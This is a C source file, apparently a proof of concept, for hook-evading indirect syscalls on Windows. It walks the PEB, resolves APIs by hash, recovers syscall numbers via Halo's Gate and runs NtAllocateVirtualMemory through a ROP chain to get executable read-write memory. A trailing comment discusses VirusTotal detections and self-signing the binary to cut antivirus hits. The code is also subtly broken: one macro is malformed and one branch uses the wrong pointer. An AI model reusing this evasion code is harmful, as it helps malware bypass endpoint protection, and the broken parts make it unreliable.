#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

#define STUB_SIZE 		24
#define FULL_STUB_SIZE	32
#define DWORD_MAX		0xFFFFFFFFUL
#define FRAMES			2
#define CHECK_GADGET(name, gadget)                                      \
    do {                                                                \
        if (!(gadget)) {                                                \
			printf("[+] %s gadget located at 0x%p\n", (name),			\
            return -1;                                                  \
        } 																\
		else {                                                        	\
	printf("[+] %s gadget located at 0x%p\n", (name),(void*)(gadget));	\
        }                                                               \
    } while (0)

typedef struct _LSA_UNICODE_STRING{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING, * PUNICODE_STR;

typedef struct _LDR_MODULE{
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _LDR_DATA_TABLE_ENTRY{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID      SectionPointer;
    ULONG      CheckSum;
    ULONG      TimeDateStamp;
    PVOID      LoadedImports;
    PVOID      EntryPointActivationContext;
    PVOID      PatchInformation;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA{
	ULONG                   Length;
	ULONG                   Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB{
	BYTE			Reserved[4];
	VOID*			Reserved2[2];
	PPEB_LDR_DATA	LoaderData;
} PEB, * PPEB;

typedef struct GADGETS{
	DWORD64	ret;
	DWORD64	jmp_rax;
	DWORD64	jmp_rcx;
	DWORD64	add_rsp;
	DWORD64	pop_rdx_rcx_r8_r9_r10_r11;
} GADGETS;

typedef enum{
	JOP_SIZE = 2,
	POP_SIZE = 11,
	ADD_RSP_SIZE = 8,
	RET_SIZE = 1,
} GADGETS_LENGTHS;

// 	r10 -> rdx -> r8 -> r9  21341
//	everytime you add an argument to a struct subtract 8 from padding to maintain struct size

typedef struct ROP_FRAME{
	DWORD64	pop_rdx_rcx_r8_r9_r10_r11;		// 2->1->3->4->1
	DWORD64	arg2;
	DWORD64	RCXArg1;	// Set this when calling RestoreContext or SystemFunction032 otherwise set this as SyscallAddressJmp
	DWORD64	arg3;
	DWORD64	arg4;
	DWORD64	R10Arg1;	// Set this in syscall else omit
	DWORD64	R11;
	
	DWORD64	Function;
	DWORD64	ReturnAddress;

	char	ShadowSpace[32];
	DWORD64	arg5;
	DWORD64	arg6;
	DWORD64	arg7;
	DWORD64	arg8;
	DWORD64	arg9;
	DWORD64	arg10;
	DWORD64	arg11;
	DWORD64	arg12;
	char	padding[116];
} ROP_FRAME;

uint64_t fn1va(const char* data){
	uint64_t hash = 0xcbf29ce484222325;
	while(*(data + 1)){
		hash ^= *data++;
		hash *= 0x100000001b3;
	}
	return hash;
}

PBYTE grab_dll_ptr(uint64_t Hash){
	PLDR_DATA_TABLE_ENTRY Module	= NULL;
	PPEB PebStruct					= (PPEB)__readgsqword(0x60);
	char DllName[MAX_PATH];
	memset(DllName, 0, MAX_PATH);
	if(	!PebStruct || 
		!PebStruct->LoaderData
	){
		return NULL;
	}
	LIST_ENTRY* HeadDllList = PebStruct->LoaderData->InLoadOrderModuleList.Flink;
	while(HeadDllList != &PebStruct->LoaderData->InLoadOrderModuleList){
		Module = CONTAINING_RECORD(HeadDllList, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if(!WideCharToMultiByte(CP_ACP, 0, Module->BaseDllName.Buffer, -1, DllName, MAX_PATH, NULL, NULL)){
			printf("[-] Failed to convert Wide to ANSI error code is %ld\n", GetLastError());
			return NULL;
		}
		if(fn1va(DllName) == Hash){
			return (PBYTE)(Module->DllBase);
		}
		HeadDllList = HeadDllList->Flink;
	}
	return NULL;
}

PBYTE grab_function_pointer(PBYTE Hmodule, uint64_t FunctionHash){
	PIMAGE_DOS_HEADER DosHeader				= (PIMAGE_DOS_HEADER)Hmodule;
	PIMAGE_NT_HEADERS NtHeader				= (PIMAGE_NT_HEADERS)(Hmodule + DosHeader->e_lfanew);
	PIMAGE_FILE_HEADER FileHeader			= (PIMAGE_FILE_HEADER)(&NtHeader->FileHeader);
	PIMAGE_OPTIONAL_HEADER OptionalHeader	= (PIMAGE_OPTIONAL_HEADER)((PBYTE)FileHeader + sizeof(IMAGE_FILE_HEADER));
	PIMAGE_EXPORT_DIRECTORY ExportDirectory	= (PIMAGE_EXPORT_DIRECTORY)(Hmodule + OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PWORD OrdinalTable	= (PWORD) (Hmodule + ExportDirectory->AddressOfNameOrdinals);
	PDWORD NameTable	= (PDWORD)(Hmodule + ExportDirectory->AddressOfNames);
	PDWORD AddressTable	= (PDWORD)(Hmodule + ExportDirectory->AddressOfFunctions);

	for(WORD i = 0; i < ExportDirectory->NumberOfNames; i++){
		char* Name = (char*)(Hmodule + NameTable[i]);
		if(fn1va(Name) == FunctionHash){
			return (Hmodule + AddressTable[OrdinalTable[i]]);
		}
	}
	return NULL;
}

void dynamic_ssn_retrieval(	uint64_t FunctionHash,
							uint64_t CheckSum,
							PIMAGE_EXPORT_DIRECTORY ExportDirectory,
							PBYTE PeBase,
							DWORD* SyscallServiceNumber,
							PDWORD* SyscallAddressJmp
	){
	PWORD OrdinalTable		= (PWORD)(PeBase + ExportDirectory->AddressOfNameOrdinals);
	PDWORD NameTable		= (PDWORD)(PeBase + ExportDirectory->AddressOfNames);
	PDWORD AddressTable		= (PDWORD)(PeBase + ExportDirectory->AddressOfFunctions);
	PDWORD AddressOfName	= NULL;

	bool found					= false;
	char CheckTest[STUB_SIZE]	= {0};

	for(WORD i = 0; i < ExportDirectory->NumberOfNames; i++){
		char* Name = (char*)(PeBase + NameTable[i]);
		if(fn1va(Name) == FunctionHash){
			AddressOfName = (PDWORD)(PeBase + AddressTable[OrdinalTable[i]]);			
			memcpy(CheckTest, AddressOfName, STUB_SIZE);
			memset(CheckTest + 4, 0, 4);
			printf("[+] Found function with name %s located at 0x%p\n", Name, (void*)(AddressOfName));
			if(fn1va(CheckTest) == CheckSum){
				*SyscallServiceNumber	= *(PDWORD)((PBYTE)AddressOfName + 4);
				*SyscallAddressJmp		=  (PDWORD)((PBYTE)AddressOfName + 18);
				printf("[+] Function is not hooked and the SSN is 0x%lx\n", *SyscallServiceNumber);
				printf("[+] Found location of syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
				return;
			}
			else{
				puts("[!] Function is hooked!");
				found = true;
				break;
			}
		}
	}
	if(!found){
		*SyscallServiceNumber	= DWORD_MAX;
		*SyscallAddressJmp		= NULL;
		return;
	}
	PBYTE AddressUp		= NULL;
	PBYTE AddressDown	= NULL;
	for(DWORD i = 1; i < ExportDirectory->NumberOfFunctions; i++){
		// This is for checking lower SSNs or addresses above the hooked stub
		AddressUp = (PBYTE)AddressOfName - (i * FULL_STUB_SIZE);
		memcpy(CheckTest, AddressUp , STUB_SIZE);
		memset(CheckTest + 4, 0, 4);
		if(fn1va(CheckTest) == CheckSum){
			*SyscallServiceNumber	= (*(PDWORD)(AddressUp + 4)) + i;
			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
			printf("[+] Found SSN 0x%lx via Halos Gate with negative delta of %ld\n", *SyscallServiceNumber, i);
			printf("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
			return;
		}
		// This is for checking higher SSNs or addresses below the hooked stub
		AddressDown = (PBYTE)AddressOfName + (i * FULL_STUB_SIZE);
		memcpy(CheckTest, AddressDown , STUB_SIZE);
		memset(CheckTest + 4, 0, 4);
		if(fn1va(CheckTest) == CheckSum){
			*SyscallServiceNumber	= (*(PDWORD)(AddressDown + 4)) - i;
			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
			printf("[+] Found SSN 0x%lx via Halos Gate with positive delta of %ld\n", *SyscallServiceNumber, i);
			printf("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
			return;
		}
	}
	puts("[!] Every function is hooked!");
	*SyscallServiceNumber	= DWORD_MAX;
	*SyscallAddressJmp		= NULL;
	return;
}

PDWORD pattern_scan(const char* pattern, size_t length, HMODULE PeBase){
	MODULEINFO ModuleInfo = {0};
	if(!GetModuleInformation(GetCurrentProcess(), PeBase, &ModuleInfo, sizeof(ModuleInfo))){
		return NULL;
	}
	for(size_t i = 0; i < ModuleInfo.SizeOfImage - length; i++){
		if(!memcmp(pattern, (PBYTE)PeBase + i, length)){
			return (PDWORD)((PBYTE)PeBase + i);
		}
	}
	return NULL;
}

bool AnotherGate(	DWORD SyscallServiceNumber,
					PDWORD SyscallAddressJmp,
					GADGETS* gadgets,
					ROP_FRAME* RopChain
	){
	static bool Triggered	= false;
	uint64_t ReturnValue	=  0;
	
	CONTEXT SaveCTX 		= {0};
	CONTEXT RopCTX 			= {0};
	
	SaveCTX.ContextFlags	= CONTEXT_ALL;
	RopCTX.ContextFlags		= CONTEXT_ALL;
	RtlCaptureContext(&SaveCTX);

	if(Triggered){
		Triggered = !Triggered;
		asm volatile ("mov %%rax, %0" : "=r"(ReturnValue));
		if(!ReturnValue){
			puts("[+] Hip hip Horray!");
			return true;
		}
		printf("[-] An error in calling the proxied syscall has occured 0x%llX\n", ReturnValue);
		return false;
	}
	
	RtlCaptureContext(&RopCTX);
	RopCTX.Rip = (DWORD64)gadgets->ret;
	RopCTX.Rsp = (DWORD64)RopChain;
	RopCTX.Rax = (DWORD64)SyscallServiceNumber;
	for(int i = 0; i < FRAMES; i++){
		RopChain[i].pop_rdx_rcx_r8_r9_r10_r11 = (DWORD64)gadgets->pop_rdx_rcx_r8_r9_r10_r11;
		RopChain[i].ReturnAddress = (DWORD64)gadgets->add_rsp;
	}
	RopChain[0].Function	= (DWORD64)gadgets->jmp_rcx;
	RopChain[0].RCXArg1		= (DWORD64)SyscallAddressJmp;
	
	RopChain[FRAMES - 1].RCXArg1	= (DWORD64)&SaveCTX;
	RopChain[FRAMES - 1].Function	= (DWORD64)RtlRestoreContext;
	Triggered = !Triggered;
	puts("[*] Calling RtlRestoreContext");
	RtlRestoreContext(&RopCTX, NULL);
	return false;
}

int main(void){
	DWORD SyscallServiceNumber		= 0;
	PDWORD SyscallAddressJmp		= NULL;
	
	const char ret_g[RET_SIZE]						= { '\xc3' };					  // ret
	const char jmp_rcx_g[JOP_SIZE]					= { '\xff', '\xe1' };			 // jmp rcx
	const char jmp_rax_g[JOP_SIZE]					= { '\xff', '\xe0' };			// jmp rax
	const char pop_rdx_rcx_r8_r9_r10_r11_g[POP_SIZE]= { '\x5a', '\x59','\x41', '\x58', '\x41', '\x59', '\x41', '\x5a', '\x41', '\x5b', '\xc3' }; // pop r8; pop r9; pop r10; pop r11; ret
	const char add_rsp_216_g[ADD_RSP_SIZE]			= { '\x48', '\x81', '\xc4', '\xd8', '\x00', '\x00', '\x00', '\xc3' };						// add rsp, 0xD ; ret
	
	const char SyscallStub[STUB_SIZE]	= {	'\x4c', '\x8b', '\xd1', 
											'\xb8', '\x00', '\x00', '\x00', '\x00', 
											'\xf6', '\x04', '\x25', '\x08', '\x03', '\xfe', '\x7f', '\x01', 
											'\x75', '\x03', 
											'\x0f', '\x05', 
											'\xc3', 
											'\xcd', '\x2e', 
											'\xc3'
										};
	const char NameNtDll[]					= {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\x00'};
	const char NtVirtualAllocate[]			= {'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\x00'};
	uint64_t CheckSum						= fn1va(SyscallStub);
	PBYTE NtdllBaseAddress					= grab_dll_ptr(fn1va(NameNtDll));
	
	GADGETS GadgetArray			= {0};
	ROP_FRAME RopChain[FRAMES]	= {0};
	
	if(!NtdllBaseAddress){
		puts("[-] Failed to Resolve PEB or base address of ntdll.dll");
		return -1;
	}else{
		printf("[+] Found ntdll.dll base address located at 0x%p\n", (PVOID)NtdllBaseAddress);
	}

	PIMAGE_DOS_HEADER DosHeader				= (PIMAGE_DOS_HEADER)NtdllBaseAddress;
	PIMAGE_NT_HEADERS NtHeader				= (PIMAGE_NT_HEADERS)(NtdllBaseAddress + DosHeader->e_lfanew);
	PIMAGE_FILE_HEADER FileHeader			= (PIMAGE_FILE_HEADER)(&NtHeader->FileHeader);
	PIMAGE_OPTIONAL_HEADER OptionalHeader	= (PIMAGE_OPTIONAL_HEADER)((PBYTE)FileHeader + sizeof(IMAGE_FILE_HEADER));
	PIMAGE_EXPORT_DIRECTORY ExportDirectory	= (PIMAGE_EXPORT_DIRECTORY)(NtdllBaseAddress + OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	GadgetArray.ret							= (DWORD64)pattern_scan(ret_g, RET_SIZE, (HMODULE)NtdllBaseAddress);
	GadgetArray.jmp_rcx 					= (DWORD64)pattern_scan(jmp_rcx_g, JOP_SIZE, (HMODULE)NtdllBaseAddress);
	GadgetArray.jmp_rax 					= (DWORD64)pattern_scan(jmp_rax_g, JOP_SIZE, (HMODULE)NtdllBaseAddress);
	GadgetArray.add_rsp 					= (DWORD64)pattern_scan(add_rsp_216_g, ADD_RSP_SIZE, (HMODULE)NtdllBaseAddress);
	GadgetArray.pop_rdx_rcx_r8_r9_r10_r11	= (DWORD64)pattern_scan(pop_rdx_rcx_r8_r9_r10_r11_g, POP_SIZE, (HMODULE)NtdllBaseAddress);

	CHECK_GADGET("ret", 						GadgetArray.ret);
	CHECK_GADGET("jmp_rcx", 					GadgetArray.jmp_rcx);
	CHECK_GADGET("jmp_rax", 					GadgetArray.jmp_rax);
	CHECK_GADGET("add_rsp", 					GadgetArray.add_rsp);
	CHECK_GADGET("pop_rdx_rcx_r8_r9_r10_r11",	GadgetArray.pop_rdx_rcx_r8_r9_r10_r11);

	
	dynamic_ssn_retrieval(	fn1va(NtVirtualAllocate), 
							CheckSum, 
							ExportDirectory, 
							NtdllBaseAddress, 
							&SyscallServiceNumber, 
							&SyscallAddressJmp
						);

	if(	SyscallServiceNumber == DWORD_MAX || 
		SyscallAddressJmp == NULL
	){
		puts("[-] Failed to retrieve SSN");
		return -1;
	}
	PVOID	arg2	= NULL;
	ULONG	arg4	= 0x1000;
	RopChain[0]		= (ROP_FRAME){
						.R10Arg1	= (DWORD64)GetCurrentProcess(),
						.arg2		= (DWORD64)&arg2,
						.arg3		= (DWORD64)0,
						.arg4		= (DWORD64)&arg4,
						.arg5		= (DWORD64)MEM_COMMIT | MEM_RESERVE,
						.arg6		= (DWORD64)PAGE_EXECUTE_READWRITE,
	};
	
	if(AnotherGate(SyscallServiceNumber, SyscallAddressJmp, &GadgetArray, RopChain)){
		printf("[+] Good job this implementation actually works!!!\n[.] NtVirtualAllocate succeeded w. memory located @ 0x%p with size of %ld bytes\n", arg2, arg4);
	}
	else{
		puts("[-] This is going to be a bad time for you....");
	}
	return 0;
}
/* 
gcc main.c -pedantic -Wall -Werror -o sol && sol.exe

The results are here https://www.virustotal.com/gui/file/87b6b2d5ebfc070d14df48b5728f89a19fbc9779aa52f50f84afd39fbb25c48a

Keep in mind you do have to sign this file otherwise the false positives are insane
\___For instance https://www.virustotal.com/gui/file/f1545e4626b9539b5b0851f6cf40d0cfc5a3b5fd8edacc261b18cd971c4676ba is a normal file with insane detection

$cert = New-SelfSignedCertificate -Type Custom -KeyUsage DigitalSignature -CertStoreLocation "."-Subject "CN=Is your teen spirit up??" -FriendlyName "Howdy im just a teen programmer"
$pwd = ConvertTo-SecureString -String "MyPfxPassword123!" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath "localhost.pfx" -Password $pwd
SignTool sign /f "localhost.pfx" /p "MyPfxPassword123!" /fd SHA256 /t "http://timestamp.digicert.com" "sol.exe"
*/
